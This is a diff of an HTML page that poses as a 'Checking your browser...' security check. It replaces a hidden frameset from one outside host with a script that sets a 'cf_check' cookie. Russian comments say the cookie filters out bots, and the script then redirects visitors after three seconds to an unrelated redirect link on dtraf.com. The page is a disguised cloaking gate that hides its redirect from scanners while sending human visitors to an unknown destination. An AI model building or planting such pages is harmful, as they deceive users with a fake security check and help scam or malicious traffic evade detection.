@@ -1,11 +1,65 @@
-<!DOCTYPE HTML>
-<html lang="en-US">
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<title>Checking your browser...</title>
-<script>
-document.write('<frameset cols="100%"><frame src="//ssl.4dq.com/rxhtml"></frameset>')
-</script>
+  <meta charset="UTF-8">
+  <title>Checking your browser...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-color: #ffffff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 100px;
+      color: #333;
+    }
+    .loader {
+      margin: 30px auto;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #3498db;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .note {
+      font-size: 16px;
+      margin-top: 20px;
+    }
+  </style>
 </head>
+<body>
 
+  <h2>Checking your browser...</h2>
+  <div class="loader"></div>
+  <div class="note">
+    Please wait while we redirect you securely.
+    <br>
+    If nothing happens, <a href="https://dtraf.com/3rxred">click here</a>.
+  </div>
+
+  <script>
+    // Проверка включён ли JS (если нет — бот)
+    // Установка тестовой куки
+    document.cookie = "cf_check=ok; path=/; SameSite=Lax";
+
+    // Проверка, что кука установлена (боты часто не поддерживают это)
+    function hasCookie(name) {
+      return document.cookie.split(';').some(c => c.trim().startsWith(name + '='));
+    }
+
+    // Редирект только если кука установлена
+    setTimeout(function () {
+      if (hasCookie("cf_check")) {
+       window.location.href = "https://dtraf.com/3rxred";
+      } else {
+        document.querySelector(".note").innerHTML = "❌ Something went wrong. Please refresh the page manually.";
+      }
+    }, 3000);
+  </script>
+
+</body>
 </html>
